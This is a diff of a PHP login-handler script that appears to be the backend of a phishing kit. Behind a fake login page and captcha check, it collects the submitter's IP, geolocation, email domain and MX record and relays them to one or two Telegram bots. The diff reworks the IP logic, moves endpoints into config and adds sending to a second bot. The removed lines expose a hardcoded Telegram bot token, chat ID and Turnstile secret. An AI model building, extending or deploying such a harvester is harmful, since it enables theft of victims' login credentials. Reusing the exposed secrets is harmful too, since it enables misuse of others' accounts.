@@ -2,23 +2,29 @@
 // Start output buffering to prevent header issues
 ob_start();
 
-// Include configuration
-if (file_exists('config.php')) {
-    require_once 'config.php';
-} else {
-    // Fallback constants for development
-    define('FRONTEND_URL', 'http://localhost:8001');
-    define('LOGIN_PAGE', 'he-opas.html');
-    define('TELEGRAM_BOT_TOKEN', '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms');
-    define('TELEGRAM_CHAT_ID', '7608981070');
-    define('TURNSTILE_SECRET', '0x4AAAAAABuU_Y3u4wDzmWBxJShHN2uHHTM');
-    define('ENVIRONMENT', 'development');
-    define('ALLOWED_ORIGINS', ['http://localhost:8001', 'http://127.0.0.1:8001']);
+// Include configuration - REQUIRED
+if (!file_exists('config.php')) {
+    http_response_code(500);
+    die('Configuration file (config.php) not found. Please create it from config.example.php');
+}
+require_once 'config.php';
+
+// Validate required configuration
+$requiredConfigs = [
+    'FRONTEND_URL', 'LOGIN_PAGE', 'TELEGRAM_BOT_TOKEN', 
+    'TELEGRAM_CHAT_ID', 'TURNSTILE_SECRET', 'ALLOWED_ORIGINS'
+];
+
+foreach ($requiredConfigs as $config) {
+    if (!defined($config)) {
+        http_response_code(500);
+        die("Required configuration '$config' not found in config.php");
+    }
 }
 
 // Set CORS headers for cross-origin requests
 $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
-$allowedOrigins = defined('ALLOWED_ORIGINS') ? ALLOWED_ORIGINS : ['http://localhost:8001'];
+$allowedOrigins = ALLOWED_ORIGINS;
 
 if (in_array($origin, $allowedOrigins)) {
     header("Access-Control-Allow-Origin: $origin");
@@ -50,55 +56,77 @@ function getDomainFromEmail($email) {
 }
 
 /**
- * Get the real client IP, supporting Nginx proxy headers and VPS deployment
+ * Get the real client IP, preferring IPv4 over IPv6
  */
 function getUserIP() {
+    // Function to check if IP is IPv4
+    $isIPv4 = function($ip) {
+        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) !== false;
+    };
+    
+    // Function to check if IP is private/local
+    $isPrivateIP = function($ip) {
+        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false;
+    };
+    
+    $potentialIPs = [];
+    
     // Try X-Forwarded-For (may be a comma-separated list)
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
-        $ip = trim($ip);
-        if (!empty($ip) && strtolower($ip) !== 'unknown' && 
-            !str_starts_with($ip, '127.') && 
-            !str_starts_with($ip, '192.168.') && 
-            !str_starts_with($ip, '10.')) {
-            return $ip;
+        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
+        foreach ($ips as $ip) {
+            $ip = trim($ip);
+            if (!empty($ip) && strtolower($ip) !== 'unknown' && !$isPrivateIP($ip)) {
+                $potentialIPs[] = $ip;
+            }
         }
     }
     
     // Try X-Real-IP
     if (!empty($_SERVER['HTTP_X_REAL_IP']) && 
         strtolower($_SERVER['HTTP_X_REAL_IP']) !== 'unknown' &&
-        !str_starts_with($_SERVER['HTTP_X_REAL_IP'], '127.') && 
-        !str_starts_with($_SERVER['HTTP_X_REAL_IP'], '192.168.') && 
-        !str_starts_with($_SERVER['HTTP_X_REAL_IP'], '10.')) {
-        return $_SERVER['HTTP_X_REAL_IP'];
+        !$isPrivateIP($_SERVER['HTTP_X_REAL_IP'])) {
+        $potentialIPs[] = $_SERVER['HTTP_X_REAL_IP'];
     }
     
     // Try Cloudflare specific header
     if (!empty($_SERVER['HTTP_CF_CONNECTING_IP']) &&
-        !str_starts_with($_SERVER['HTTP_CF_CONNECTING_IP'], '127.') && 
-        !str_starts_with($_SERVER['HTTP_CF_CONNECTING_IP'], '192.168.') && 
-        !str_starts_with($_SERVER['HTTP_CF_CONNECTING_IP'], '10.')) {
-        return $_SERVER['HTTP_CF_CONNECTING_IP'];
+        !$isPrivateIP($_SERVER['HTTP_CF_CONNECTING_IP'])) {
+        $potentialIPs[] = $_SERVER['HTTP_CF_CONNECTING_IP'];
     }
     
-    // Fallback to REMOTE_ADDR
+    // Try REMOTE_ADDR
+    if (!empty($_SERVER['REMOTE_ADDR']) && !$isPrivateIP($_SERVER['REMOTE_ADDR'])) {
+        $potentialIPs[] = $_SERVER['REMOTE_ADDR'];
+    }
+    
+    // Prefer IPv4 addresses
+    foreach ($potentialIPs as $ip) {
+        if ($isIPv4($ip)) {
+            return $ip;
+        }
+    }
+    
+    // If no IPv4 found, use first available IP but mark as IPv6
+    if (!empty($potentialIPs)) {
+        return $potentialIPs[0] . ' (IPv6)';
+    }
+    
+    // Fallback to REMOTE_ADDR even if private
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
     
-    // If we're getting localhost/private IPs, try to get public IP via external service
-    if ($ip === '127.0.0.1' || $ip === 'localhost' || 
-        str_starts_with($ip, '192.168.') || 
-        str_starts_with($ip, '10.') || 
-        str_starts_with($ip, '172.')) {
-        
+    // If we're getting localhost/private IPs, try to get public IPv4 via external service
+    if ($isPrivateIP($ip) || $ip === 'Unknown') {
         try {
             $context = stream_context_create([
                 'http' => [
-                    'timeout' => 5
+                    'timeout' => 5,
+                    'header' => "User-Agent: PHP-Login-Script/1.0\r\n"
                 ]
             ]);
-            $publicIP = file_get_contents('https://api.ipify.org', false, $context);
-            if ($publicIP !== false) {
+            // Request specifically IPv4 format
+            $publicIP = file_get_contents(IP_SERVICE_URL . '?format=text', false, $context);
+            if ($publicIP !== false && !empty(trim($publicIP))) {
                 return trim($publicIP) . " (VPS detected: $ip)";
             }
         } catch (Exception $e) {
@@ -128,7 +156,7 @@ function getLocationFromIP($ip) {
                     'timeout' => 5
                 ]
             ]);
-            $response = file_get_contents("http://ipapi.co/$cleanIP/json/", false, $context);
+            $response = file_get_contents(GEO_SERVICE_URL . "/$cleanIP/json/", false, $context);
             
             if ($response !== false) {
                 $data = json_decode($response, true);
@@ -183,7 +211,7 @@ function getMXRecord($domain) {
  * Send message to Telegram bot
  */
 function sendToTelegram($botToken, $chatId, $message) {
-    $url = "https://api.telegram.org/bot$botToken/sendMessage";
+    $url = TELEGRAM_API_URL . $botToken . "/sendMessage";
     $data = [
         'chat_id' => $chatId,
         'text' => $message
@@ -201,6 +229,27 @@ function sendToTelegram($botToken, $chatId, $message) {
     $result = file_get_contents($url, false, $context);
     
     return $result !== false;
+}
+
+/**
+ * Send message to both Telegram bots (if configured)
+ */
+function sendToAllTelegramBots($message) {
+    $success = false;
+    
+    // Send to primary bot (required)
+    if (defined('TELEGRAM_BOT_TOKEN') && defined('TELEGRAM_CHAT_ID') && 
+        !empty(TELEGRAM_BOT_TOKEN) && !empty(TELEGRAM_CHAT_ID)) {
+        $success = sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $message) || $success;
+    }
+    
+    // Send to secondary bot (optional)
+    if (defined('TELEGRAM_BOT_TOKEN_2') && defined('TELEGRAM_CHAT_ID_2') && 
+        !empty(TELEGRAM_BOT_TOKEN_2) && !empty(TELEGRAM_CHAT_ID_2)) {
+        $success = sendToTelegram(TELEGRAM_BOT_TOKEN_2, TELEGRAM_CHAT_ID_2, $message) || $success;
+    }
+    
+    return $success;
 }
 
 // Initialize variables
@@ -238,7 +287,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $error = 'Captcha is required.';
     } else {
         // Verify Turnstile
-        $verifyUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
+        $verifyUrl = TURNSTILE_VERIFY_URL;
         $verifyData = [
             'secret' => TURNSTILE_SECRET,
             'response' => $turnstileResponse
@@ -287,24 +336,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $msg .= "MX Record: $mxRecord\n";
         $msg .= "Date of Submission: $timestamp";
         
-        // Send to main Telegram bot
-        $mainSuccess = sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, $msg);
-        if ($mainSuccess) {
-            error_log("✅ Message sent to main Telegram bot successfully!");
+        // Send to all configured Telegram bots
+        $telegramSuccess = sendToAllTelegramBots($msg);
+        if ($telegramSuccess) {
+            error_log("✅ Message sent to Telegram bot(s) successfully!");
         } else {
-            error_log("❌ Failed to send message to main Telegram bot");
-        }
-        
-        // Send to secondary bot if credentials are defined
-        if (defined('SECONDARY_TELEGRAM_BOT_TOKEN') && defined('SECONDARY_TELEGRAM_CHAT_ID')) {
-            $secondarySuccess = sendToTelegram(SECONDARY_TELEGRAM_BOT_TOKEN, SECONDARY_TELEGRAM_CHAT_ID, $msg);
-            if ($secondarySuccess) {
-                error_log("✅ Message sent to secondary Telegram bot successfully!");
-            } else {
-                error_log("❌ Failed to send message to secondary Telegram bot");
-            }
-        } else {
-            error_log("ℹ️ No secondary Telegram bot configured");
+            error_log("❌ Failed to send message to any Telegram bot");
         }
     }
     
